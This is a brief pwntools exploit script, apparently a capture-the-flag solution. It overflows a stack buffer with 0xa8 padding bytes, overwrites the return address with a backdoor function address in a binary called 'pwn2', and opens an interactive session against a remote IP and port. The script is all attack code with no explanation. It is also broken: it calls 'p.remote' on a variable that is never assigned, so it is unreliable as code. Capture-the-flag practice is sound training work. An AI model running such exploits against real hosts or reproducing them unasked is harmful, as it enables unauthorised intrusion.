from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 
# p=process('./pwn2')
p.remote('61.147.171.105',49825)
elf=ELF('./pwn2')
pause()

backdoor_addr=0x0000000000400762
p.recvuntil(b'this is pwn1,can you do that??\n')
payload=b'a'*0xa8+p64(backdoor_addr)
p.sendline(payload)
p.interactive()
